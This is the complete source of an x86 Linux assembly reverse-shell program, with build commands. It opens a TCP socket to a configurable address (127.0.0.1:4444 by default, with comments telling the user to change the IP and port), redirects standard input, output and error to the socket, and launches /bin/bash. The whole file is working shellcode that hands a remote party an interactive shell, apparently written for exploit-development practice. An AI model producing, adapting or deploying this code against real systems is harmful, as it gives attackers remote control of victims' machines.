; Filename:	reverse_shell.nasm
; Author:	Jules Adriaens
; Assemble:	nasm -f elf32 -o reverse_shell.o reverse_shell.nasm
; Link:		ld -o reverse_shell reverse_shell.o

global _start

section .text
_start:


    ; Create TCP socket
    ; s = socket(AF_INET, SOCK_STREAM, 0);
    xor edx, edx        ; EDX = 0
    push edx            ; ipproto_ip = 0
    xor ebx, ebx        ; EBX = 0
    inc ebx             ; EBX = 1
    push ebx            ; sock_stream = 1
    push byte 0x2       ; pf_inet = 2

    mov ecx, esp	; ECX points to args on stack
    push byte 0x66	; socketcall = 102
    pop eax		; EAX = 0x66
    int 0x80		; syscall
    xchg esi, eax	; store sockfd


    ; Initiate connection
    ; connect(s, (struct sockaddr *) &sa, sizeof(sa));
    push 0x0101017f	; sin_addr = 127.0.0.1	[!] Change IP here (0x0101017f == 127.0.0.1)
    push word 0x5c11	; sin_port = 4444       [!] Change port here (0x115c == 4444)
    inc ebx             ; EBX = 2
    push bx             ; sin_family = 2

    mov ecx, esp        ; ECX points to struct sockaddr
    push 0x10           ; sizeof(host_addr)
    push ecx            ; pointer to sockaddr
    push esi            ; sockfd

    mov ecx, esp        ; ECX points to args on stack
    inc ebx             ; sys_connect, EBX = 3
    push byte 0x66      ; socketcall = 102
    pop eax             ; EAX = 0x66
    int 0x80            ; syscall


    ; Duplicate file descriptors
    ; dup2(s, 0), dup2(s, 1), dup2(s, 2)
    xchg ebx, esi	; store sockfd
    push byte 0x2	; counter for loop
    pop ecx		; ECX = 2

    loop:
          mov al, 0x3f	; dup2() = 63
          int 0x80	; syscall
          dec ecx	; counter -1
    jns loop


    ; Spawn /bin/bash
    ; execve("/bin/bash", 0, 0);
    push edx		; Terminator = 0
    mov al, 0x0b	; execve = 11
    push 0x68736162	; push ////bin/bash on stack
    push 0x2f6e6962
    push 0x2f2f2f2f

    mov ebx, esp	; EBX points to args on stack
    mov ecx, edx	; ECX = 0
    int 0x80		; syscall
